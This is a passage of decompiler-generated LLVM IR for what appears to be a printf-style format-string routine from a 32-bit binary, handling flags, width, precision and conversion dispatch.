  %v2_e228 = ptrtoint i32* %stack_var_-200 to i32
  %v2_e26c = ptrtoint i32* %stack_var_-348 to i32
  %v2_e270 = ptrtoint i32* %stack_var_-72 to i32
  %v2_e124 = ptrtoint i32* %stack_var_-44 to i32
  %v2_e130 = ptrtoint i32* %stack_var_-52 to i32
  %v7_df8c = zext i8 %tmp102 to i32
  %v2_dfc4 = ptrtoint i32* %stack_var_-73 to i32
  %v1_dfcc = bitcast i32* %stack_var_-73 to i8*
  %v2_dfd4 = icmp ugt i32 %tmp104, 4
  %v7_dfd4 = icmp eq i32 %tmp104, 5
  %v7_deb8 = ptrtoint i32* %stack_var_-280 to i32
  %v5_dee8195 = icmp sgt i32 %tmp105, 0
  %tmp207 = icmp ugt i32 %tmp104, 7
  %tmp208 = icmp ugt i32 %tmp104, 15
  %v2_e0f8 = icmp ugt i32 %tmp104, 16
  %v7_e0f8 = icmp eq i32 %tmp104, 17
  %v2_e0fc = xor i1 %v7_e0f8, true
  %v3_e0fc = and i1 %v2_e0f8, %v2_e0fc
  %v2_e180 = icmp ugt i32 %tmp104, 18
  %v7_e180 = icmp eq i32 %tmp104, 19
  %v2_e184 = xor i1 %v7_e180, true
  %v3_e184 = and i1 %v2_e180, %v2_e184
  %v7_e21c = icmp eq i32 %tmp104, 20
  %v1_df34 = add i32 %tmp104, add (i32 ptrtoint (i32* @global_var_19acc.326 to i32), i32 -1)
  %v2_df34 = inttoptr i32 %v1_df34 to i8*
  %v2_df60 = xor i1 %v7_dfd4, true
  %v3_df60 = and i1 %v2_dfd4, %v2_df60
  %v7_df94 = icmp eq i32 %tmp104, 1
  %v2_dfdc = xor i1 %v2_dfd4, true
  %v3_dfdc = or i1 %v7_dfd4, %v2_dfdc
  %tmp209 = icmp ult i32 %tmp104, 3
  %v7_e044 = icmp eq i32 %tmp104, 3
  %v11_e050 = icmp eq i32 %tmp104, 4
  %v9_dec0 = mul nuw nsw i32 %v4_deb0, 8
  %v10_dec0 = add i32 %v7_deb8, %v9_dec0
  br label %dec_label_pc_de20.outer

dec_label_pc_de20.outer:                          ; preds = %dec_label_pc_e400, %dec_label_pc_ddcc
  %v0_de2045 = phi i32 [ %v3_e400, %dec_label_pc_e400 ], [ %v0_de1c, %dec_label_pc_ddcc ]
  %v0_df54 = phi i32 [ %stack_var_-336.4, %dec_label_pc_e400 ], [ %tmp103, %dec_label_pc_ddcc ]
  %stack_var_-356.1.ph = phi i32 [ %stack_var_-356.3, %dec_label_pc_e400 ], [ 0, %dec_label_pc_ddcc ]
  br label %dec_label_pc_de20.outer36

dec_label_pc_de20.outer36:                        ; preds = %dec_label_pc_de20.outer, %dec_label_pc_e40c
  %v0_de2044 = phi i32 [ %v0_de2045, %dec_label_pc_de20.outer ], [ %v1_e40c, %dec_label_pc_e40c ]
  %v5_de4c = phi i32 [ %v0_de2045, %dec_label_pc_de20.outer ], [ %v1_de7c, %dec_label_pc_e40c ]
  %stack_var_-356.1.ph37 = phi i32 [ %stack_var_-356.1.ph, %dec_label_pc_de20.outer ], [ %v1_e2ec, %dec_label_pc_e40c ]
  %v1_de20188 = inttoptr i32 %v0_de2044 to i8*
  %v2_de20189 = load i8, i8* %v1_de20188, align 1
  %v2_de24191 = icmp eq i8 %v2_de20189, 0
  br i1 %v2_de24191, label %dec_label_pc_de3c, label %bb138

bb138:                                            ; preds = %dec_label_pc_de20.outer36, %.thread6
  %v2_de20193 = phi i8 [ %v2_de20, %.thread6 ], [ %v2_de20189, %dec_label_pc_de20.outer36 ]
  %v1_de34192 = phi i32 [ %v2_de34, %.thread6 ], [ %v0_de2044, %dec_label_pc_de20.outer36 ]
  %v8_de28 = icmp eq i8 %v2_de20193, 37
  br i1 %v8_de28, label %dec_label_pc_de3c, label %.thread6

.thread6:                                         ; preds = %bb138
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_de34 = add i32 %v1_de34192, 1
  store i32 %v2_de34, i32* @r4, align 4
  %v1_de20 = inttoptr i32 %v2_de34 to i8*
  %v2_de20 = load i8, i8* %v1_de20, align 1
  %v2_de24 = icmp eq i8 %v2_de20, 0
  br i1 %v2_de24, label %dec_label_pc_de3c, label %bb138

dec_label_pc_de3c:                                ; preds = %bb138, %.thread6, %dec_label_pc_de20.outer36
  %v1_de34.lcssa = phi i32 [ %v0_de2044, %dec_label_pc_de20.outer36 ], [ %v2_de34, %.thread6 ], [ %v1_de34192, %bb138 ]
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_de3c = sub i32 %v1_de34.lcssa, %v5_de4c
  %v9_de3c = icmp eq i32 %v1_de34.lcssa, %v5_de4c
  br i1 %v9_de3c, label %dec_label_pc_de70, label %dec_label_pc_de44

dec_label_pc_de44:                                ; preds = %dec_label_pc_de3c
  store i32 %v2_de3c, i32* @r5, align 4
  %tmp140 = icmp slt i32 %v2_de3c, 1
  br i1 %tmp140, label %bb142, label %bb141

bb141:                                            ; preds = %dec_label_pc_de44
  store i32 %v5_de4c, i32* %r0.global-to-local, align 4
  %v5_de54 = load i32, i32* @fp, align 4
  store i32 %v5_de54, i32* %r2.global-to-local, align 4
  br label %bb142

bb142:                                            ; preds = %dec_label_pc_de44, %bb141
  %tmp143 = phi i1 [ true, %bb141 ], [ false, %dec_label_pc_de44 ]
  store i32 56924, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %tmp143, i32 ptrtoint (i32* @global_var_138f4.316 to i32))
  %v0_de5c = load i32, i32* %r0.global-to-local, align 4
  %v1_de5c = load i32, i32* @r5, align 4
  %v9_de5c = icmp eq i32 %v0_de5c, %v1_de5c
  br i1 %v9_de5c, label %dec_label_pc_de64, label %dec_label_pc_e414

dec_label_pc_de64:                                ; preds = %bb142
  %v2_de68 = add i32 %v0_de5c, %stack_var_-356.1.ph37
  store i32 %v2_de68, i32* @ip, align 4
  %v0_de70.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_de70

dec_label_pc_de70:                                ; preds = %dec_label_pc_de3c, %dec_label_pc_de64
  %v0_de84 = phi i32 [ %v5_de4c, %dec_label_pc_de3c ], [ %v0_de70.pre, %dec_label_pc_de64 ]
  %v1_e2ec = phi i32 [ %stack_var_-356.1.ph37, %dec_label_pc_de3c ], [ %v2_de68, %dec_label_pc_de64 ]
  %v1_de70 = inttoptr i32 %v0_de84 to i8*
  %v2_de70 = load i8, i8* %v1_de70, align 1
  %v2_de74 = icmp eq i8 %v2_de70, 0
  br i1 %v2_de74, label %dec_label_pc_e41c, label %dec_label_pc_de7c

dec_label_pc_de7c:                                ; preds = %dec_label_pc_de70
  %v1_de7c = add i32 %v0_de84, 1
  %v2_de7c = inttoptr i32 %v1_de7c to i8*
  %v3_de7c = load i8, i8* %v2_de7c, align 1
  %v7_de80 = icmp eq i8 %v3_de7c, 37
  store i32 %v1_de7c, i32* %r2.global-to-local, align 4
  br i1 %v7_de80, label %dec_label_pc_e40c, label %dec_label_pc_de8c

dec_label_pc_de8c:                                ; preds = %dec_label_pc_de7c
  store i32 %v2_dd6c, i32* @r4, align 4
  store i32 %v2_dd6c, i32* %r0.global-to-local, align 4
  store i32 %v1_de7c, i32* %stack_var_-352, align 4
  store i32 0, i32* %stack_var_-44, align 4
  %v2_dea0 = call i32 @function_e734(i8* %v1_dea0)
  store i32 %v2_dd6c, i32* @r0, align 4
  %v0_dea8 = call i32 @function_e530()
  store i32 %v0_dea8, i32* %r0.global-to-local, align 4
  store i32 %v4_deb0, i32* @ip, align 4
  br i1 %tmp137, label %bb146, label %bb145

bb145:                                            ; preds = %dec_label_pc_de8c
  br label %bb146

bb146:                                            ; preds = %dec_label_pc_de8c, %bb145
  %storemerge = phi i32 [ %v10_dec0, %bb145 ], [ %v7_debc, %dec_label_pc_de8c ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  br i1 %v5_dee8195, label %dec_label_pc_decc, label %dec_label_pc_deec

dec_label_pc_decc:                                ; preds = %bb146, %dec_label_pc_decc
  %v5_ded8197 = phi i32 [ %v5_ded8, %dec_label_pc_decc ], [ %v2_ded4, %bb146 ]
  %v0_decc196 = phi i32 [ %v1_ded0, %dec_label_pc_decc ], [ %storemerge, %bb146 ]
  %v2_decc = add i32 %v5_ded8197, -32
  %v3_decc = inttoptr i32 %v2_decc to i32*
  store i32 %v0_decc196, i32* %v3_decc, align 4
  %v0_ded0 = load i32, i32* %r0.global-to-local, align 4
  %v1_ded0 = add i32 %v0_ded0, 8
  store i32 %v1_ded0, i32* %r0.global-to-local, align 4
  %v1_ded8.pre = load i32, i32* %r2.global-to-local, align 4
  %v4_ded8 = mul i32 %v1_ded8.pre, 4
  %v5_ded8 = add i32 %v4_ded8, %v2_ded4
  %v1_dee4 = add i32 %v1_ded8.pre, 1
  store i32 %v1_dee4, i32* %r2.global-to-local, align 4
  %v5_dee8 = icmp slt i32 %v1_ded8.pre, %tmp105
  br i1 %v5_dee8, label %dec_label_pc_decc, label %dec_label_pc_deec

dec_label_pc_deec:                                ; preds = %dec_label_pc_decc, %bb146
  store i32 %tmp104, i32* %r2.global-to-local, align 4
  br i1 %v2_def0, label %dec_label_pc_def8, label %dec_label_pc_df1c

dec_label_pc_def8:                                ; preds = %dec_label_pc_deec
  %v3_def8 = load i32, i32* %stack_var_-72, align 4
  store i32 %v1_e2ec, i32* @ip, align 4
  %v1_df04 = inttoptr i32 %v3_def8 to i32*
  %v2_df04 = load i32, i32* %v1_df04, align 4
  store i32 %v2_df04, i32* %r0.global-to-local, align 4
  %v1_df08 = and i32 %v0_df54, 3840
  store i32 %v1_e2ec, i32* %r2.global-to-local, align 4
  %v3_df10 = ashr i32 %v1_e2ec, 31
  %v4_df14 = inttoptr i32 %v2_df04 to i16*
  %v5_df14 = call i32 @function_13b74(i16* %v4_df14, i32 %v1_df08, i32 %v1_e2ec, i32 %v3_df10)
  store i32 %v5_df14, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e400

dec_label_pc_df1c:                                ; preds = %dec_label_pc_deec
  br i1 %tmp207, label %dec_label_pc_e0b8, label %dec_label_pc_df24

dec_label_pc_df24:                                ; preds = %dec_label_pc_df1c
  %v3_df34 = load i8, i8* %v2_df34, align 1
  %v4_df34 = zext i8 %v3_df34 to i32
  store i32 %v4_df34, i32* @r4, align 4
  %v7_df38 = icmp eq i8 %v3_df34, 10
  br i1 %v7_df38, label %dec_label_pc_df44, label %bb147

bb147:                                            ; preds = %dec_label_pc_df24
  br label %bb151

dec_label_pc_df44:                                ; preds = %dec_label_pc_df24
  %v1_df54 = and i32 %v0_df54, 64
  %v2_df54 = icmp eq i32 %v1_df54, 0
  br i1 %v2_df54, label %bb151, label %bb150

bb150:                                            ; preds = %dec_label_pc_df44
  br label %bb151

bb151:                                            ; preds = %bb147, %dec_label_pc_df44, %bb150
  br i1 %v3_df60, label %.thread, label %dec_label_pc_df68

.thread:                                          ; preds = %bb151
  %v5_df60 = sub nsw i32 0, %v4_df34
  store i32 %v5_df60, i32* @r4, align 4
  br label %dec_label_pc_df80

dec_label_pc_df68:                                ; preds = %bb151
  br i1 %v7_e044, label %bb152, label %dec_label_pc_df74

bb152:                                            ; preds = %dec_label_pc_df68
  br label %dec_label_pc_df80

dec_label_pc_df74:                                ; preds = %dec_label_pc_df68
  br i1 %v7_df94, label %dec_label_pc_df84, label %dec_label_pc_df80

dec_label_pc_df80:                                ; preds = %.thread, %bb152, %dec_label_pc_df74
  %v0_dfac81 = phi i32 [ %v5_df60, %.thread ], [ %v4_df34, %bb152 ], [ %v4_df34, %dec_label_pc_df74 ]
  br label %dec_label_pc_df84

dec_label_pc_df84:                                ; preds = %dec_label_pc_df74, %dec_label_pc_df80
  %v0_dfac80 = phi i32 [ %v0_dfac81, %dec_label_pc_df80 ], [ %v4_df34, %dec_label_pc_df74 ]
  %storemerge91 = phi i32 [ 11, %dec_label_pc_df80 ], [ 6, %dec_label_pc_df74 ]
  store i32 %storemerge91, i32* @r6, align 4
  %v3_df84 = load i32, i32* %stack_var_-348, align 4
  %v1_df88 = icmp slt i32 %v3_df84, 0
  %v7_df8c. = select i1 %v1_df88, i32 %v7_df8c, i32 32
  store i32 %v7_df8c., i32* @sb, align 4
  br i1 %v7_df94, label %bb157, label %.thread15

.thread15:                                        ; preds = %dec_label_pc_df84
  store i32 %v2_ded4, i32* %r2.global-to-local, align 4
  %v2_df9c = load i32, i32* @ip, align 4
  %v5_df9c = mul i32 %v2_df9c, 4
  %v6_df9c = add i32 %v5_df9c, %v2_ded4
  %v2_dfa0 = add i32 %v6_df9c, -276
  %v3_dfa0 = inttoptr i32 %v2_dfa0 to i32*
  %v4_dfa0 = load i32, i32* %v3_dfa0, align 4
  %v2_dfa8 = and i32 %v4_dfa0, 3840
  br label %bb157

bb157:                                            ; preds = %dec_label_pc_df84, %.thread15
  %storemerge93 = phi i32 [ %v2_dfa8, %.thread15 ], [ 1024, %dec_label_pc_df84 ]
  store i32 %storemerge93, i32* @r0, align 4
  store i32 %v0_dfac80, i32* @r2, align 4
  %v3_dfb0 = load i32, i32* %stack_var_-72, align 4
  store i32 %v3_dfb0, i32* @r1, align 4
  %v0_dfb4 = call i32 @function_13b04()
  store i32 %v0_dfb4, i32* @r2, align 4
  %v0_dfc0 = load i32, i32* @r1, align 4
  store i32 %v0_dfc0, i32* @r3, align 4
  store i32 %v2_dfc4, i32* %r0.global-to-local, align 4
  %v2_dfcc = call i32 @function_13ba0(i8* %v1_dfcc)
  store i32 %v2_dfcc, i32* %r0.global-to-local, align 4
  store i32 %v2_dfcc, i32* @r4, align 4
  br i1 %v3_dfdc, label %bb160, label %dec_label_pc_dfe0

dec_label_pc_dfe0:                                ; preds = %bb157
  %v3_dfcc = inttoptr i32 %v2_dfcc to i8*
  %v3_dfe0 = load i8, i8* %v3_dfcc, align 1
  %v7_dfe4 = icmp eq i8 %v3_dfe0, 45
  %v2_dfec = or i32 %v0_df54, 2
  %v2_dfec.stack_var_-336.0 = select i1 %v7_dfe4, i32 %v2_dfec, i32 %v0_df54
  br i1 %v7_dfe4, label %.thread17, label %dec_label_pc_e000

.thread17:                                        ; preds = %dec_label_pc_dfe0
  %v3_dff0 = add i32 %v2_dfcc, 1
  store i32 %v3_dff0, i32* @r4, align 4
  store i32 2, i32* @r6, align 4
  br label %bb160

dec_label_pc_e000:                                ; preds = %dec_label_pc_dfe0
  %v1_e000 = and i32 %v2_dfec.stack_var_-336.0, 2
  %v2_e000 = icmp eq i32 %v1_e000, 0
  br i1 %v2_e000, label %dec_label_pc_e00c, label %bb158

bb158:                                            ; preds = %dec_label_pc_e000
  store i32 0, i32* @r6, align 4
  br label %bb160

dec_label_pc_e00c:                                ; preds = %dec_label_pc_e000
  %v1_e00c = urem i32 %v2_dfec.stack_var_-336.0, 2
  %v2_e00c = icmp eq i32 %v1_e00c, 0
  br i1 %v2_e00c, label %bb160, label %bb159

bb159:                                            ; preds = %dec_label_pc_e00c
  store i32 4, i32* @r6, align 4
  br label %bb160

bb160:                                            ; preds = %.thread17, %bb158, %bb157, %dec_label_pc_e00c, %bb159
  %v0_e068 = phi i32 [ %v2_dfcc, %bb157 ], [ %v3_dff0, %.thread17 ], [ %v2_dfcc, %dec_label_pc_e00c ], [ %v2_dfcc, %bb159 ], [ %v2_dfcc, %bb158 ]
  %v0_e024 = phi i32 [ %v0_df54, %bb157 ], [ %v2_dfec, %.thread17 ], [ %v0_df54, %dec_label_pc_e00c ], [ %v0_df54, %bb159 ], [ %v0_df54, %bb158 ]
  %v3_e014 = load i32, i32* %stack_var_-348, align 4
  %v1_e01c = icmp slt i32 %v3_e014, 0
  br i1 %v1_e01c, label %bb161, label %bb162

bb161:                                            ; preds = %bb160
  br label %bb162

bb162:                                            ; preds = %bb160, %bb161
  %storemerge206 = phi i32 [ 1, %bb161 ], [ %v3_e014, %bb160 ]
  %v0_e04c = phi i32 [ 1, %bb161 ], [ %v3_e014, %bb160 ]
  store i32 %storemerge206, i32* %r2.global-to-local, align 4
  %v1_e024 = and i32 %v0_e024, 16
  %v2_e024 = icmp eq i32 %v1_e024, 0
  %v2_e030 = sub i32 %v2_dfc4, %v0_e068
  store i32 %v2_e030, i32* @r5, align 4
  br i1 %v2_e024, label %bb169, label %dec_label_pc_e038

dec_label_pc_e038:                                ; preds = %bb162
  br i1 %tmp209, label %bb163, label %bb164

bb163:                                            ; preds = %dec_label_pc_e038
  store i32 6, i32* @r6, align 4
  br label %bb164

bb164:                                            ; preds = %dec_label_pc_e038, %bb163
  br i1 %v7_e044, label %bb165, label %bb166

bb165:                                            ; preds = %bb164
  store i32 9, i32* @r6, align 4
  br label %bb166

bb166:                                            ; preds = %bb164, %bb165
  %tmp210 = icmp ugt i32 %v0_e04c, %v2_e030
  br i1 %tmp210, label %bb169, label %bb167

bb167:                                            ; preds = %bb166
  br i1 %v11_e050, label %dec_label_pc_e058, label %bb169

dec_label_pc_e058:                                ; preds = %bb167
  %v1_e058 = inttoptr i32 %v0_e068 to i8*
  %v2_e058 = load i8, i8* %v1_e058, align 1
  %v7_e05c = icmp eq i8 %v2_e058, 48
  br i1 %v7_e05c, label %bb168, label %.thread24

bb168:                                            ; preds = %dec_label_pc_e058
  store i32 1, i32* %r2.global-to-local, align 4
  br label %bb169

.thread24:                                        ; preds = %dec_label_pc_e058
  %v2_e064 = add i32 %v2_e030, 1
  store i32 %v2_e064, i32* %r2.global-to-local, align 4
  br label %bb169

bb169:                                            ; preds = %bb166, %bb168, %bb167, %bb162, %.thread24
  %v5_e0a8 = phi i32 [ %v0_e04c, %bb167 ], [ %v0_e04c, %bb162 ], [ 1, %bb168 ], [ %v2_e064, %.thread24 ], [ %v0_e04c, %bb166 ]
  %v1_e068 = inttoptr i32 %v0_e068 to i8*
  %v2_e068 = load i8, i8* %v1_e068, align 1
  %v7_e06c = icmp eq i8 %v2_e068, 48
  br i1 %v7_e06c, label %dec_label_pc_e074, label %dec_label_pc_e0a4

dec_label_pc_e074:                                ; preds = %bb169
  %v0_e078 = load i32, i32* @r6, align 4
  %v7_e07c = icmp slt i32 %v0_e078, 6
  br i1 %v7_e07c, label %bb171, label %bb170

bb170:                                            ; preds = %dec_label_pc_e074
  store i32 11, i32* @r6, align 4
  br label %bb171

bb171:                                            ; preds = %dec_label_pc_e074, %bb170
  br i1 %v7_df94, label %.thread27, label %dec_label_pc_e098

.thread27:                                        ; preds = %bb171
  store i32 142964, i32* @ip, align 4
  store i32 5, i32* @r5, align 4
  store i32 105136, i32* @r4, align 4
  br label %dec_label_pc_e0b0

dec_label_pc_e098:                                ; preds = %bb171
  %v2_e098 = icmp eq i32 %v5_e0a8, 0
  br i1 %v2_e098, label %bb172, label %dec_label_pc_e0a4

bb172:                                            ; preds = %dec_label_pc_e098
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_e0b0

dec_label_pc_e0a4:                                ; preds = %dec_label_pc_e098, %bb169
  %v2_e0a4 = sub i32 %v5_e0a8, %v2_e030
  %tmp211 = icmp ugt i32 %v5_e0a8, %v2_e030
  br i1 %tmp211, label %.thread85, label %dec_label_pc_e0b0

.thread85:                                        ; preds = %dec_label_pc_e0a4
  store i32 %v2_e0a4, i32* @r8, align 4
  br label %dec_label_pc_e2bcthread-pre-split

dec_label_pc_e0b0:                                ; preds = %dec_label_pc_e0a4, %.thread27, %bb172
  %v1_e2c0.pre205 = phi i32 [ %v2_e030, %dec_label_pc_e0a4 ], [ 5, %.thread27 ], [ 0, %bb172 ]
  store i32 0, i32* @r8, align 4
  br label %dec_label_pc_e2bcthread-pre-split

dec_label_pc_e0b8:                                ; preds = %dec_label_pc_df1c
  br i1 %tmp208, label %dec_label_pc_e0f8, label %dec_label_pc_e0c0

dec_label_pc_e0c0:                                ; preds = %dec_label_pc_e0b8
  %v3_e0d0 = load i32, i32* %stack_var_-72, align 4
  %v0_e0d4 = load i32, i32* @fp, align 4
  store i32 %v0_e0d4, i32* %r0.global-to-local, align 4
  %v1_e0d8 = inttoptr i32 %v3_e0d0 to i32*
  %v2_e0d8 = load i32, i32* %v1_e0d8, align 4
  store i32 %v2_e0d8, i32* %r2.global-to-local, align 4
  %v3_e0d8 = add i32 %v3_e0d0, 4
  %v4_e0d8 = inttoptr i32 %v3_e0d8 to i32*
  %v5_e0d8 = load i32, i32* %v4_e0d8, align 4
  %v6_e0dc = inttoptr i32 %v5_e0d8 to i32*
  %v7_e0dc = call i32 @function_13cfc(i32 %v0_e0d4, i32 56544, i32 %v2_e0d8, i32* %v6_e0dc, i32 %v2_e26c, i32 56544)
  store i32 %v7_e0dc, i32* %r0.global-to-local, align 4
  %v1_e0e0 = icmp slt i32 %v7_e0dc, 0
  br i1 %v1_e0e0, label %dec_label_pc_e414, label %dec_label_pc_e0e8

dec_label_pc_e0e8:                                ; preds = %dec_label_pc_e0c0
  %v2_e0ec = add i32 %v7_e0dc, %v1_e2ec
  store i32 %v2_e0ec, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_e400

dec_label_pc_e0f8:                                ; preds = %dec_label_pc_e0b8
  br i1 %v3_e0fc, label %dec_label_pc_e180, label %dec_label_pc_e100

dec_label_pc_e100:                                ; preds = %dec_label_pc_e0f8
  store i32 0, i32* @sl, align 4
  store i32 0, i32* %stack_var_-52, align 4
  %v3_e108 = load i32, i32* %stack_var_-72, align 4
  store i32 %v3_e108, i32* %r0.global-to-local, align 4
  br i1 %v7_e0f8, label %dec_label_pc_e110, label %dec_label_pc_e148

dec_label_pc_e110:                                ; preds = %dec_label_pc_e100
  %v1_e110 = inttoptr i32 %v3_e108 to i32*
  %v2_e110 = load i32, i32* %v1_e110, align 4
  %v9_e114 = icmp eq i32 %v2_e110, 0
  store i32 %v2_e110, i32* %stack_var_-44, align 4
  br i1 %v9_e114, label %dec_label_pc_e1c0, label %dec_label_pc_e120

dec_label_pc_e120:                                ; preds = %dec_label_pc_e110
  %v3_e120 = load i32, i32* %stack_var_-348, align 4
  store i32 %v2_e124, i32* @r0, align 4
  %v4_e128 = ashr i32 %v3_e120, 31
  %v5_e128 = or i32 %v4_e128, %v3_e120
  store i32 %v5_e128, i32* %r2.global-to-local, align 4
  store i32 %v2_e124, i32* @r1, align 4
  %v6_e134 = call i32 @function_13730(i32 %v2_e124, i32 %v2_e124, i32 %v5_e128, i32 %v2_e130, i32 0, i32 %v2_e110)
  store i32 %v6_e134, i32* %r0.global-to-local, align 4
  %v3_e138 = icmp eq i32 %v6_e134, -1
  store i32 %v6_e134, i32* @r5, align 4
  br i1 %v3_e138, label %dec_label_pc_e414, label %dec_label_pc_e2ac

dec_label_pc_e148:                                ; preds = %dec_label_pc_e100
  store i32 %v2_e228, i32* %r7.global-to-local, align 4
  %v1_e14c = inttoptr i32 %v3_e108 to i32*
  %v2_e14c = load i32, i32* %v1_e14c, align 4
  store i32 %v2_e130, i32* %r2.global-to-local, align 4
  store i32 %v2_e228, i32* %r0.global-to-local, align 4
  %v5_e158 = call i32 @function_136dc(i32 %v2_e228, i32 %v2_e14c, i32 %v2_e130, i32 %tmp105, i32 0)
  store i32 %v5_e158, i32* %r0.global-to-local, align 4
  %v7_e15c = icmp eq i32 %v5_e158, -1
  store i32 %v5_e158, i32* @r5, align 4
  br i1 %v7_e15c, label %dec_label_pc_e414, label %dec_label_pc_e168

dec_label_pc_e168:                                ; preds = %dec_label_pc_e148
  %v0_e168 = load i32, i32* @sl, align 4
  store i32 %v0_e168, i32* @r8, align 4
  store i32 %v2_e228, i32* @r4, align 4
  store i32 11, i32* @r6, align 4
  store i32 32, i32* @sb, align 4
  %v1_e178 = trunc i32 %v0_e168 to i8
  %v2_e178 = load i32, i32* %r7.global-to-local, align 4
  %v4_e178 = add i32 %v2_e178, %v5_e158
  %v5_e178 = inttoptr i32 %v4_e178 to i8*
  store i8 %v1_e178, i8* %v5_e178, align 1
  %v0_e2c0.pre.pre = load i32, i32* @r8, align 4
  %v1_e2c0.pre.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_e2bcthread-pre-split

dec_label_pc_e180:                                ; preds = %dec_label_pc_e0f8
  br i1 %v3_e184, label %dec_label_pc_e21c, label %dec_label_pc_e188

dec_label_pc_e188:                                ; preds = %dec_label_pc_e180
  %v3_e188 = load i32, i32* %stack_var_-72, align 4
  store i32 %v3_e188, i32* %r0.global-to-local, align 4
  %v1_e190 = inttoptr i32 %v3_e188 to i32*
  %v2_e190 = load i32, i32* %v1_e190, align 4
  br i1 %v7_e180, label %dec_label_pc_e190, label %dec_label_pc_e1f4

dec_label_pc_e190:                                ; preds = %dec_label_pc_e188
  store i32 %v2_e190, i32* @r4, align 4
  %v2_e194 = icmp eq i32 %v2_e190, 0
  br i1 %v2_e194, label %dec_label_pc_e1c0, label %dec_label_pc_e19c

dec_label_pc_e19c:                                ; preds = %dec_label_pc_e190, %dec_label_pc_e224
  %v0_e1a0 = phi i32 [ %v2_e190, %dec_label_pc_e190 ], [ %v3_e234, %dec_label_pc_e224 ]
  %v3_e19c = load i32, i32* %stack_var_-348, align 4
  store i32 %v0_e1a0, i32* %r0.global-to-local, align 4
  %v4_e1a4 = ashr i32 %v3_e19c, 31
  %v5_e1a4 = or i32 %v4_e1a4, %v3_e19c
  %v2_e1a8 = inttoptr i32 %v0_e1a0 to i8*
  %v3_e1a8 = call i32 @function_f710(i8* %v2_e1a8, i32 %v5_e1a4)
  store i32 %v3_e1a8, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r8, align 4
  store i32 %v3_e1a8, i32* @r5, align 4
  store i32 11, i32* @r6, align 4
  store i32 32, i32* @sb, align 4
  br label %dec_label_pc_e2bc

dec_label_pc_e1c0:                                ; preds = %dec_label_pc_e190, %dec_label_pc_e110
  %v3_e1c0 = load i32, i32* %stack_var_-348, align 4
  %v1_e1c4 = icmp slt i32 %v3_e1c0, 0
  br i1 %v1_e1c4, label %dec_label_pc_e1dc, label %dec_label_pc_e1cc

dec_label_pc_e1cc:                                ; preds = %dec_label_pc_e1c0
  %tmp212 = icmp ult i32 %v3_e1c0, 6
  br i1 %tmp212, label %dec_label_pc_e1e4, label %dec_label_pc_e1dc

dec_label_pc_e1dc:                                ; preds = %dec_label_pc_e1cc, %dec_label_pc_e1c0
  br label %dec_label_pc_e1e4

dec_label_pc_e1e4:                                ; preds = %dec_label_pc_e1cc, %dec_label_pc_e1dc
  %storemerge97 = phi i32 [ 6, %dec_label_pc_e1dc ], [ 0, %dec_label_pc_e1cc ]
  store i32 %storemerge97, i32* @r5, align 4
  store i32 0, i32* @r8, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_19ab8.321 to i32), i32* @r4, align 4
  store i32 11, i32* @r6, align 4
  store i32 32, i32* @sb, align 4
  br label %dec_label_pc_e2bc

dec_label_pc_e1f4:                                ; preds = %dec_label_pc_e188
  store i32 %v2_e190, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r8, align 4
  store i32 1, i32* @r5, align 4
  store i32 11, i32* @r6, align 4
  store i32 32, i32* @sb, align 4
  store i32 %v2_e228, i32* @r4, align 4
  store i32 %v2_e190, i32* %stack_var_-200, align 4
  br label %dec_label_pc_e2bcthread-pre-split

dec_label_pc_e21c:                                ; preds = %dec_label_pc_e180
  br i1 %v7_e21c, label %dec_label_pc_e224, label %dec_label_pc_e240

dec_label_pc_e224:                                ; preds = %dec_label_pc_e21c
  %v0_e224 = call i32 @function_d0ec()
  store i32 %v0_e224, i32* %r0.global-to-local, align 4
  %v1_e22c = inttoptr i32 %v0_e224 to i32*
  %v2_e22c = load i32, i32* %v1_e22c, align 4
  store i32 %v2_e22c, i32* @r0, align 4
  store i32 128, i32* @r2, align 4
  %v3_e234 = call i32 @function_f9cc(i32 %v2_e22c, i32 %v2_e228, i32 128)
  store i32 %v3_e234, i32* %r0.global-to-local, align 4
  store i32 %v3_e234, i32* @r4, align 4
  br label %dec_label_pc_e19c

dec_label_pc_e240:                                ; preds = %dec_label_pc_e21c
  %v4_e248 = load i32, i32* inttoptr (i32 143620 to i32*), align 4
  %v1_e250 = add i32 %v4_e248, 10
  store i32 %v1_e250, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e254

dec_label_pc_e254:                                ; preds = %dec_label_pc_e29c, %dec_label_pc_e240
  %v1_e264 = phi i32 [ %v1_e29c, %dec_label_pc_e29c ], [ %v4_e248, %dec_label_pc_e240 ]
  %v1_e254 = inttoptr i32 %v1_e264 to i8*
  %v2_e254 = load i8, i8* %v1_e254, align 1
  %v3_e254 = zext i8 %v2_e254 to i32
  store i32 %v3_e254, i32* %r2.global-to-local, align 4
  %v9_e25c = icmp eq i32 %v3_e254, %tmp99
  br i1 %v9_e25c, label %dec_label_pc_e264, label %dec_label_pc_e29c

dec_label_pc_e264:                                ; preds = %dec_label_pc_e254
  %v2_e264 = sub i32 %v1_e264, %v4_e248
  %v0_e268 = load i32, i32* @fp, align 4
  store i32 %v0_e268, i32* %r0.global-to-local, align 4
  store i32 %v2_e270, i32* %r2.global-to-local, align 4
  %v4_e278 = mul i32 %v2_e264, 4
  %v5_e278 = add i32 %v4_e278, 154336
  %v6_e278 = inttoptr i32 %v5_e278 to i32*
  %v7_e278 = load i32, i32* %v6_e278, align 4
  store i32 %v7_e278, i32* @ip, align 4
  store i32 57988, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v7_e278)
  %v0_e284 = load i32, i32* %r0.global-to-local, align 4
  %v1_e284 = icmp slt i32 %v0_e284, 0
  br i1 %v1_e284, label %dec_label_pc_e414, label %dec_label_pc_e28c

dec_label_pc_e28c:                                ; preds = %dec_label_pc_e264
  %v2_e290 = add i32 %v0_e284, %v1_e2ec
  br label %dec_label_pc_e400

dec_label_pc_e29c:                                ; preds = %dec_label_pc_e254
  %v1_e29c = add i32 %v1_e264, 1
